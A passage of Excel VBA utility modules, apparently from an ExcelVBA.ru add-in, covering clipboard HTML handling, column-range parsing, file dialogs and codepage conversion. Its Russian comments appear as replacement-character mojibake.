        txt$ = GetContentFromClipboard: GetContentFromClipboard = ""
        Dim iStart&, iEnd&, URL$
        URL$ = TextBetween(txt$, "SourceURL:", vbNewLine, 1)
        iStart& = Val(TextBetween(txt$, "StartFragment:", vbNewLine, 1))
        iEnd& = Val(TextBetween(txt$, "EndFragment:", vbNewLine, 1))
        
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & iEnd& - iStart& & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <a href='" & URL$ & "'>" & URL$ & "</a>"
        If TEST_ACTIONS_MODE Then AddBalloon msg$, bt_Information
        
        If needsURL Then GetContentFromClipboard = URL$: Exit Function
        
        GetContentFromClipboard = ChangeTextCharset(Mid(txt$, iStart& + 1, iEnd& - iStart&), "utf-8", "windows-1251")
    End If
    
End Function

Private Sub test_vbaClipboard()
    'This routine tests the vbaClipboard object.
    'Before running this, copy some text from Word. This will place Rich Text Format data
    'on the clipboard. The test will preserve the RTF data, then use the clipboard
    'to manipulate some plain text ("CF_TEXT"). Finally, the test will put the
    'RTF data back on the clipboard. When the test is finished, you should be able
    'to go back into Word and hit Ctrl+V and paste your original copied text (with formatting).
    
    'Instantiate a vbaClipboard object
    Dim myClipboard As New vbaClipboard
    
    'The ClipboardFormat class encapsulates a clipboard format number and a name
    Dim ClipboardFormat As vbaClipboardFormat, HTML_FormatNumber
    
    'Handle errors below
    On Error GoTo ErrorHandler
    On Error Resume Next
    
    'Show the currently available formats
    'The ClipboardFormatsAvailable property returns a collection of ClipboardFormat objects
    'representing all formats currently available on the clipboard.
    
    Debug.Print "===================================================================="
    
    For Each ClipboardFormat In myClipboard.ClipboardFormatsAvailable
        Debug.Print ClipboardFormat.Number, ClipboardFormat.Name
        Debug.Print "Len=" & Len(myClipboard.GetClipboardText(ClipboardFormat.Number)), myClipboard.GetClipboardText(ClipboardFormat.Number)
    Next ClipboardFormat
    Exit Sub
    
    Debug.Print "===================================================================="
    HTML_FormatNumber = myClipboard.ClipboardFormatsAvailable("HTML Format").Number
    Debug.Print myClipboard.GetClipboardText(HTML_FormatNumber)
    
    'Preserve the RTF currently on the clipboard (you did copy some, right?)
    Dim oldRTF As String
    'Get the format number value for Rich Text Format
    Dim richTextFormatNumber As Long
    On Error Resume Next
    richTextFormatNumber = myClipboard.ClipboardFormatsAvailable("Rich Text Format").Number
    If Err.Number <> 0 Then
        On Error GoTo ErrorHandler
        Err.Raise vbObjectError + 1, , "The clipboard does not have any Rich Text Format data."
    End If
    On Error GoTo ErrorHandler
    
    'Get the RTF data from the clipboard
    oldRTF = myClipboard.GetClipboardText(richTextFormatNumber)
    'Debug.Print oldRTF
    
    'Use the clipboard for something else
    Dim s As String
    s = "Hello, world!"
    myClipboard.SetClipboardText s, "CF_TEXT"
    
    'Get it back again
    Debug.Print myClipboard.GetClipboardText(1)
    
    'Show the currently available formats
    Debug.Print "===================================================================="
    For Each ClipboardFormat In myClipboard.ClipboardFormatsAvailable
        Debug.Print ClipboardFormat.Number, ClipboardFormat.Name
    Next ClipboardFormat
    
    'Now put back the RTF
    myClipboard.SetClipboardText oldRTF, "Rich Text Format"
    
    'Show the currently available formats
    Debug.Print "===================================================================="
    For Each ClipboardFormat In myClipboard.ClipboardFormatsAvailable
        Debug.Print ClipboardFormat.Number, ClipboardFormat.Name
    Next ClipboardFormat
    'You can now paste back into Word, and you'll get whatever text you selected
    Exit Sub
ErrorHandler:
    MsgBox Err.Description
End Sub

Attribute VB_Name = "mod_CommonFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_CommonActions
' Author        : Igor Vakhnenko            Date: 11.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module

Function ColumnsStringToRangeAddress(ByVal txt$) As String
    ' gets string like "A-F,8" and returns range "$A:$F,$H:$H"
    On Error Resume Next
    Dim ra As Range, col As Variant
    With ThisWorkbook.Worksheets(1)
        For Each col In ParseColumnsStringEx(txt)
            If ra Is Nothing Then Set ra = .Cells(Val(col)) Else Set ra = Union(ra, .Cells(Val(col)))
        Next
    End With
    ColumnsStringToRangeAddress = ra.EntireColumn.Address
End Function

Function ParseColumnsStringEx(ByVal txt$, Optional ByRef norm1$, Optional ByRef norm2$) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| "A-C;8,,11-9, |fffd|-|fffd|; 4,21,"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Array(1,2,3,8,11,10,9,5,6,7,8,9,10,11,4,21)
    ' (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|; |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 9-15 |fffd| 17-13 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    '  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Const enARR$ = "ABCEHKMOPTX", ruARR$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Const cc& = 256        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim i&, arr As Variant, j&, spl As Variant, cn&

    For i = 1 To Len(enARR$): txt = Replace(txt, Mid(ruARR$, i, 1), Mid(enARR$, i, 1)): Next i
    txt = Replace(txt, " ", ""): txt = Replace(txt, ";", ",")
    txt = Replace(txt, ":", "-"): txt = Replace(txt, ".", ","): txt = UCase(txt)
    For i = 1 To Len(txt)
        If Not Mid(txt, i, 1) Like "[A-Z0-9,-]" Then Mid(txt, i, 1) = ","
    Next i
    While InStr(1, txt, ",,"): txt = Replace(txt, ",,", ","): Wend
    While InStr(1, txt, "--"): txt = Replace(txt, "--", "-"): Wend
    txt = Replace(txt, ",-", ","): txt = Replace(txt, "-,", ",")
    If Left(txt, 1) = "-" Or Left(txt, 1) = "," Then txt = Mid(txt, 2)
    If Right(txt, 1) = "-" Or Right(txt, 1) = "," Then txt = Left(txt, Len(txt) - 1)
    norm1$ = Replace(txt$, ",", ", ")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|

    arr = Split(txt$, ","): Dim n As Long: ReDim tmpArr(0 To 0)
    For i = LBound(arr) To UBound(arr)
        spl = Split(arr(i), "-")
        For j = LBound(spl) To UBound(spl)
            cn& = 0: cn& = ColumnNameToColumnNumber(spl(j)): If cn& Then spl(j) = cn&
            If Not spl(j) Like String(Len(spl(j)), "#") Then spl(j) = ""
        Next j
        If Val(spl(0)) > cc& Then spl(0) = "": spl(UBound(spl)) = ""
        If Val(spl(UBound(spl))) > cc& Then spl(UBound(spl)) = cc&
        If UBound(spl) > 1 Then arr(i) = spl(0) & "-" & spl(UBound(spl)) Else arr(i) = Join(spl, "-")
        If UBound(spl) = 1 Then If spl(0) = spl(1) Then arr(i) = spl(0)
        If UBound(spl) = 1 Then If spl(0) = "" Then arr(i) = spl(1)
    Next i
    norm2$ = Join(arr, ","): norm2$ = Replace(norm2$, ",-", ","): norm2$ = Replace(norm2$, "-,", ",")
    While InStr(1, norm2$, ",,"): norm2$ = Replace(norm2$, ",,", ","): Wend
    If Left(norm2$, 1) = "," Then norm2$ = Mid(norm2$, 2)
    If Right(norm2$, 1) = "," Then norm2$ = Left(norm2$, Len(norm2$) - 1)

    For i = LBound(arr) To UBound(arr)
        Select Case True
            Case arr(i) = "", Val(arr(i)) < 0
            Case IsNumeric(arr(i))
                tmpArr(UBound(tmpArr)) = arr(i): ReDim Preserve tmpArr(0 To UBound(tmpArr) + 1)
            Case arr(i) Like "*#-#*"
                spl = Split(arr(i), "-")
                If UBound(spl) = 1 Then
                    If IsNumeric(spl(0)) And IsNumeric(spl(1)) Then
                        If spl(0) <= cc& Then
                            If spl(1) > cc& Then spl(1) = cc&
                            For j = Val(spl(0)) To Val(spl(1)) Step IIf(Val(spl(0)) > Val(spl(1)), -1, 1)
                                tmpArr(UBound(tmpArr)) = j: ReDim Preserve tmpArr(0 To UBound(tmpArr) + 1)
                            Next j
                        End If
                    End If
                End If
        End Select
    Next i
    If UBound(tmpArr) Then
        ReDim Preserve tmpArr(0 To UBound(tmpArr) - 1)
        ParseColumnsStringEx = tmpArr
    End If
End Function

Function GetFilePathEx(Optional ByVal FileType$ = "", Optional ByVal DialogTitle$, _
                       Optional ByVal FilterDescription$ = "Excel files", Optional ByVal FilterExtension$ = "*.*") As String
    On Error Resume Next
    InitialPath$ = ThisWorkbook.Path & "\"
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFileDialogCaption")
    With Application.FileDialog(msoFileDialogOpen)
        .AllowMultiSelect = False
        .ButtonName = tt("SelectButtonCaption"): .Title = DialogTitle$
        .InitialFileName = SETT.GetText("GetFilePathEx_" & FileType, InitialPath)
        .Filters.Clear: .Filters.Add FilterDescription, FilterExtension
        If .Show <> -1 Then Exit Function
        GetFilePathEx = .SelectedItems(1)
        Folder$ = Left(.SelectedItems(1), InStrRev(.SelectedItems(1), "\"))
        SETT.SetText "GetFilePathEx_" & FileType, Folder$
    End With
End Function

Function GetFilePathExMulti(Optional ByVal FileType$ = "", Optional ByVal DialogTitle$, _
                            Optional ByVal FilterDescription$ = "Excel files", Optional ByVal FilterExtension$ = "*.*") As String
    On Error Resume Next: Dim file
    InitialPath$ = ThisWorkbook.Path & "\"
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFileDialogCaption")
    With Application.FileDialog(msoFileDialogOpen)
        .AllowMultiSelect = True
        .ButtonName = tt("SelectButtonCaption"): .Title = DialogTitle$
        .InitialFileName = SETT.GetText("GetFilePathEx_" & FileType, InitialPath)
        .Filters.Clear: .Filters.Add FilterDescription, FilterExtension
        If .Show <> -1 Then Exit Function
        For Each file In .SelectedItems
            GetFilePathExMulti = GetFilePathExMulti & IIf(GetFilePathExMulti = "", "", ARSEP) & file
        Next file
        Folder$ = Left(.SelectedItems(1), InStrRev(.SelectedItems(1), "\"))
        SETT.SetText "GetFilePathEx_" & FileType, Folder$
    End With
End Function

Function PickNewColor(Optional ByVal i_OldColor As Double = xlNone) As Double
    ' shows pick color dialog and returns selected color (RGB format)
    On Error Resume Next:
    PickNewColor = i_OldColor
    Const BGColor As Long = 13160660, ColorIndexLast As Long = 32
    Dim myOrgColor As Double, myNewColor As Double, WB As Workbook
    Dim myRGB_R As Integer, myRGB_G As Integer, myRGB_B As Integer
    If ActiveWorkbook Is Nothing Then Application.ScreenUpdating = False: Set WB = Workbooks.Add
    myOrgColor = ActiveWorkbook.Colors(ColorIndexLast)        'save original palette color

    i_Color = IIf(i_OldColor = xlNone, BGColor, i_OldColor): myRGB_R = i_Color Mod 256
    i_Color = i_Color \ 256: myRGB_G = i_Color Mod 256
    i_Color = i_Color \ 256: myRGB_B = i_Color Mod 256
    ActiveWorkbook.ResetColors        'AppActivate Application.Name
    If Application.Dialogs(xlDialogEditColor).Show(ColorIndexLast, myRGB_R, myRGB_G, myRGB_B) Then
        PickNewColor = ActiveWorkbook.Colors(ColorIndexLast)
        ThisWorkbook.Colors(ColorIndexLast) = myOrgColor
    End If
    If Not WB Is Nothing Then WB.Close False: Application.ScreenUpdating = True
End Function

Function GetKeyName(ByVal KeyCode As Integer, ByVal Shift As Integer) As String
    Select Case KeyCode
        Case 112 To 135: Button$ = "F" & (KeyCode - 111)
        Case 32: Button$ = "SpaceBar"
        Case 8: Button$ = "BackSpace"
        Case 9: Button$ = "Tab"
        Case 13: Button$ = "Enter"
        Case 16: Button$ = ""        '"Shift"
        Case 17: Button$ = ""        '"Ctrl"
        Case 18: Button$ = ""        '"Alt"
        Case 20: Button$ = "CapsLock"
        Case 27: Button$ = "Esc"
        Case 33: Button$ = "PageUp"
        Case 34: Button$ = "PageDown"
        Case 35: Button$ = "End"
        Case 36: Button$ = "Home"
        Case 37: Button$ = "Left Arrow"
        Case 38: Button$ = "Up Arrow"
        Case 39: Button$ = "Right Arrow"
        Case 40: Button$ = "Down Arrow"
        Case 44: Button$ = "PrintScreen"
        Case 45: Button$ = "Insert"
        Case 46: Button$ = "Delete"
        Case vbKeyNumlock: Button$ = "Numlock"
        Case 145: Button$ = "ScrollLock"

        Case 91: Button$ = "Win(Left)"
        Case 92: Button$ = "Win(Right)"
        Case 96 To 105: Button$ = "Numpad (" & KeyCode - 96 & ")"
        Case vbKeyMultiply: Button$ = "Numpad (*)"
        Case vbKeyAdd: Button$ = "Numpad (+)"
        Case vbKeySubtract: Button$ = "Numpad (-)"
        Case vbKeyDecimal: Button$ = "Numpad (,)"
        Case vbKeyDivide: Button$ = "Numpad (/)"

        Case 166: Button$ = "Browser Back"
        Case 167: Button$ = "Browser Forward"
        Case 168: Button$ = "Browser Refresh"
        Case 169: Button$ = "Browser Stop"
        Case 170: Button$ = "Browser Search"
        Case 171: Button$ = "Browser Favorites"
        Case 172: Button$ = "Browser Home"
        Case 173: Button$ = "Volume Mute"
        Case 174: Button$ = "Volume Down"
        Case 175: Button$ = "Volume Up"
        Case 176: Button$ = "Next Track"
        Case 177: Button$ = "Previous Track"
        Case 178: Button$ = "Stop Media"
        Case 179: Button$ = "Play/Pause"
        Case 180: Button$ = "Start Mail"
        Case 181: Button$ = "Select Media"
        Case 182: Button$ = "Start App 1"
        Case 183: Button$ = "Start App 2"

        Case 48 To 57, 65 To 90: Button$ = Chr(KeyCode)
        Case Else: Button$ = "{button " & KeyCode & "}"
    End Select

    If Len(Button$) Then
        If (Shift And 1) Then GetKeyName = GetKeyName & "Shift + "
        If (Shift And 2) Then GetKeyName = GetKeyName & "Ctrl + "
        If (Shift And 4) Then GetKeyName = GetKeyName & "Alt + "
    End If
    GetKeyName = GetKeyName & Button$
End Function

Function ColumnNameByColumnNumber(ByVal col As Long) As String
    resA1 = Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1)
    ColumnNameByColumnNumber = col & " |fffd|" & Split(resA1, "$")(1) & "|fffd|"
End Function

Function ColumnNameToColumnNumber(ByVal txt$) As Long
    On Error Resume Next    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|.   |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 0
    ColumnNameToColumnNumber = Split(Application.ConvertFormula(txt$ & "1", xlA1, xlR1C1, True), "C")(1)
End Function

Function grv(ByVal n$)
    On Error Resume Next: With SETT: grv = .GetRegValue(.U(n$)): End With
End Function

Function GetResponse(ByRef BytesArr, ByVal Encoding$) As String
    On Error Resume Next
    Dim ResponseFilename$
    Set ADODBStream = CreateObject("ADODB.Stream")
    With ADODBStream
        ResponseFilename$ = Environ("tmp") & "\response.txt"
        If Len(Encoding$) Then .Charset = Encoding$
        .Type = 1        ' adTypeBinary:
        .Open: .Write BytesArr
        .SaveToFile ResponseFilename$, 2
        .Type = 2        'adTypeText
        .LoadFromFile ResponseFilename$
        GetResponse = .ReadText
        .Close
        Kill ResponseFilename$
    End With
    Set ADODBStream = Nothing
End Function

Function WEB_PARSERS_FOLDER$()
    WEB_PARSERS_FOLDER$ = "resources/" & PROJECT_NAME$ & "/samples"
End Function

Function IsURL(ByVal txt$, Optional ByVal AllowFileURL As Boolean) As Boolean
    On Error Resume Next
    IsURL = IsURL Or (txt$ Like "http://?*.?*")
    IsURL = IsURL Or (txt$ Like "https://?*.?*")
    IsURL = IsURL Or (txt$ Like "ftp://?*.?*")
    If AllowFileURL Then
        IsURL = IsURL Or (txt$ Like "\\?*\?*")
        IsURL = IsURL Or (txt$ Like "[A-Z]:\?*")
    End If
End Function


Function FileFormatByExtension(ByVal ext$) As XlFileFormat
    Select Case ext$
        Case "CSV", "DAT", "TXT": FileFormatByExtension = xlCSV
        Case "XLS": FileFormatByExtension = xlWorkbookNormal
        Case "XLSB": FileFormatByExtension = xlExcel12
        Case "XLSX": FileFormatByExtension = xlOpenXMLWorkbook
        Case "XLSM": FileFormatByExtension = xlOpenXMLWorkbookMacroEnabled
        Case Else: FileFormatByExtension = xlWorkbookNormal
    End Select
End Function

Function RemoveExtraSeparators(ByRef txt$, Optional ByVal sep$ = ARSEP)
    On Error Resume Next
    If sep$ = "" Then Exit Function
    Dim sep2$: sep2$ = sep$ & sep$
    While InStr(1, txt$, sep2$, vbBinaryCompare): txt$ = Replace(txt$, sep2$, sep$): Wend
    If txt$ Like "*" & sep$ Then txt = Left(txt, Len(txt) - Len(sep$))
    If txt$ Like sep$ & "*" Then txt = Mid(txt, Len(sep$) + 1)
End Function

Sub ExtendOrCollapseForm(ByRef CB As CommandButton)
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Set UF = CB.Parent
    If UF Is Nothing Then Exit Sub
    'Dim zo&, k As Double: zo = SETT.GetNumber("ComboBox_Zoom", 100): If zo < 40 Then zo = 100

    ' |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: h=200-414 hide=Frame2,Frame4,Frame5
    txt_height$ = Split(Split(UF.Tag)(0), "h=")(1)
    If Not txt_height Like "#*-*#" Then Exit Sub
    H1& = Split(txt_height, "-")(0)
    H2& = Split(txt_height, "-")(1)

    txt_hide$ = Split(Split(UF.Tag)(1), "hide=")(1)
    arr_hide = Split(txt_hide, ",")


    Dim NormalMode As Boolean        ' TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    NormalMode = CB.Caption Like "* >>"

    NewHeight& = IIf(NormalMode, H2&, H1&)
    'k = Round(IIf(IIf(NormalMode, H1&, H2&) = UF.Height, zo / 100, 1), 2)

    ButtonsPositionBottom = UF.Height - CB.Top    '* k
    UF.Height = NewHeight&    ' * k

    For Each item In arr_hide
        UF.Controls(item).Visible = NormalMode
    Next

    For Each Button In UF.Controls
        If Button.Name Like "CommandButton*" Then
            If Button.HelpContextID = 2 Then
                Button.Top = UF.Height - ButtonsPositionBottom
            End If
        End If
    Next
    CB.Caption = CB.Tag & " " & IIf(NormalMode, " <<", " >>")
    UF.Height = UF.Height
End Sub

Function ClearLinksErrors(ByVal txt$) As String
    On Error Resume Next
    txt$ = Replace(txt$, "=""about:blank", "=""")
    txt$ = Replace(txt$, "=""about:", "=""")
    ClearLinksErrors = txt$
End Function

Function GetTagInfoFromClipboard(Optional ByVal html$) As Variant
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:
    ' array(TagName, TagAttributeName, TagAttributeValue)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd|

    Dim txt$, Tag As Variant, res$
    GetTagInfoFromClipboard = ""
    txt = shtr.clipBoardText
    If Len(txt) < 3 Then If Len(html$) Then txt = html
    If Len(txt) = 0 Then Exit Function

    txt = GetTags(txt, "Any tag", , , "TagHeaderOnly 1")
    For Each Tag In Array("id", "name", "itemprop", "class")
        res = GetAttributeFromTag(txt, Tag)
        If Len(res) Then GetTagInfoFromClipboard = Array(Mid(Split(txt)(0), 2), Tag, res): Exit Function
    Next
    Tag = "": Tag = Split(Split(txt, " ")(1), "=")(0)
    If Len(Tag) Then
        res = GetAttributeFromTag(txt, Tag)
        If Len(res) Then GetTagInfoFromClipboard = Array(Mid(Split(txt)(0), 2), Tag, res)
    End If
End Function
Attribute VB_Name = "mod_ConvertCodepage"
'---------------------------------------------------------------------------------------
' Module        : mod_ConvertCodepage                    Version:
' Author        : Igor Vakhnenko                   Date: 17.08.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Private Module

Private Const CP_UTF8 As Long = 65001
Private Const LMEM_ZEROINIT As Long = &H40

#If VBA7 Then
    Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32.dll" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As String, ByVal cchMultiByte As Long, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As Long) As Long
    Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32.dll" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As Long, ByVal lpMultiByteStr As LongPtr, ByVal cchMultiByte As Long, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As Long
    Declare PtrSafe Function GetACP Lib "kernel32" () As Long

    Declare PtrSafe Function LocalAlloc Lib "kernel32.dll" (ByVal wFlags As Long, ByVal wBytes As Long) As LongPtr
    Declare PtrSafe Function LocalFree Lib "kernel32.dll" (ByVal hMem As LongPtr) As LongPtr
    Declare PtrSafe Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)

#Else
    Private Declare Function MultiByteToWideChar Lib "kernel32.dll" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As String, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
    Private Declare Function WideCharToMultiByte Lib "kernel32.dll" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, ByVal lpMultiByteStr As Long, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
    Declare Function GetACP Lib "kernel32" () As Long

    Declare Function LocalAlloc Lib "kernel32.dll" (ByVal wFlags As Long, ByVal wBytes As Long) As Long
    Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Long) As Long
    Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
#End If


Public Function WinToUTF8(ByRef inString As String) As String
    #If VBA7 Then
        Dim hMemLock1 As LongPtr, hMemLock2 As LongPtr
    #Else
        Dim hMemLock1 As Long, hMemLock2 As Long
    #End If
    Dim iStrSize As Long, lMaxSize As Long
    lMaxSize = Len(inString) * 2 + 2

    hMemLock1 = LocalAlloc(LMEM_ZEROINIT, lMaxSize)
    hMemLock2 = LocalAlloc(LMEM_ZEROINIT, lMaxSize)

    iStrSize = MultiByteToWideChar(65001, 0&, inString, &HFFFF, hMemLock1, lMaxSize)
    iStrSize = WideCharToMultiByte(0, 0&, hMemLock1, iStrSize, hMemLock2, lMaxSize, 0&, 0&)    ' CP_UTF8

    If Len(iStrSize) Then
        WinToUTF8 = String$(iStrSize, 0&)
        Call CopyMemory(ByVal WinToUTF8, ByVal hMemLock2, iStrSize)
    End If

    Call LocalFree(hMemLock1)
    Call LocalFree(hMemLock2)
End Function

'Public Function WinToUTF8(ByVal sInput As String) As String
'    Dim iStrSize As Long, lMaxSize As Long, str1 As String
'    Dim p As Long
'    Dim str2 As String
'    If Len(sInput) = 0 Then Exit Function
'
'    lMaxSize = Len(sInput)
'    str1 = String$(lMaxSize, 0&)
'    iStrSize = MultiByteToWideChar(65001, 0&, sInput, &HFFFF, StrPtr(str1), lMaxSize)
'    If iStrSize > 0 Then
'        WinToUTF8 = Left$(str1, iStrSize - 1)
'    Else
'        WinToUTF8 = sInput
'    End If
'End Function

Private Sub test04503945()
    Dim sFile As String, sText As String
    sFile = "C:\VO_OTKRDAN3_9965_9965_20180731_00c363b5-e3b6-453f-bae1-2da48a221152.xml"       '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sText = ReadFile(sFile)                       '|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sText = WinToUTF8(sText)
    MsgBox sText
End Sub

Private Sub RunReEncode()
    Dim sFile As String, sText As String
    sFile = "C:\VO_OTKRDAN3_9965_9965_20180731_00c363b5-e3b6-453f-bae1-2da48a221152.xml"       '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sText = ReadFile(sFile)                       '|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sText = ConvertCodePage(sText, 65001, 1251)   '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: 1251 - ANSI, 65001 - UTF-8
    SaveToFile sText, sFile                       '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    MsgBox sText
End Sub

Function ReadFile(sFile As String) As String
    On Error Resume Next
    Dim ff As Integer, Size As Long
    ff = FreeFile()
    Open sFile For Binary As #ff
    Size = LOF(ff)
    If Size = 0 Then Exit Function
    ReadFile = String$(Size, 0)
    Get #ff, , ReadFile
    Close #ff
End Function

Function SaveToFile(sText As String, sFile As String) As Boolean
